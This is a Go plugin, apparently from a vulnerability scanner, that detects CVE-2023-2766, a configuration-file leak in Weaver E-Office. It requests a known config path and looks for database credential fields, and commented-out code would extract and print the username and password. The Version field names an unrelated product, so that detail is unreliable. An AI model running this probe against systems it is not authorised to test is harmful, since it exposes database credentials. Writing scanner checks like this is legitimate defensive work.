package goplugin

import (
	utils "Yscanner/utils"
	"net/http"
	"strings"
)

func init() {
	Register("weaver_leak_cve_2023_2766", &weaver_leak_cve_2023_2766{})
}

type weaver_leak_cve_2023_2766 struct{}

func (p *weaver_leak_cve_2023_2766) Info() PluginInfo {
	return PluginInfo{
		Name:     "泛微E-Office信息泄露",
		VulnInfo: "泛微E-Office是一款企业级的全流程办公自动化软件，它包括协同办公、文档管理、知识管理、工作流管理等多个模块，涵盖了企业日常工作中的各个环节。该产品configfile存在信息泄露。",
		VulnID:   "CVE-2023-2766",
		Level:    "7.5 HIGH",
		URL:      "",
		Version:  "SysAid <= 23.3.36",
		CWE:      "CWE-552	对外部实体的文件或目录可访问",
	}
}

func (p *weaver_leak_cve_2023_2766) Check(netloc string) bool {
	req, err := http.NewRequest("GET", netloc+"/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini", nil)
	if err != nil {
		return false
	}
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 &&
		strings.Contains(resp.ResponseRaw, "sdbuser") && strings.Contains(resp.ResponseRaw, "sdbpassword") {
		// sdbuser := ""
		// re := regexp.MustCompile(`sdbuser\s*=\s*"([^"]+)"`)
		// matches := re.FindStringSubmatch(resp.ResponseRaw)
		// if len(matches) >= 2 {
		// 	sdbuser = matches[1]
		// }

		// sdbpassword := ""
		// re = regexp.MustCompile(`sdbpassword = "([^"]+)"`)
		// matches = re.FindStringSubmatch(resp.ResponseRaw)
		// if len(matches) >= 2 {
		// 	sdbpassword = matches[1]
		// }
		// fmt.Printf("[+] %s : user => %s, password => %s\n", netloc, sdbuser, sdbpassword)
		return true
	}

	return false
}
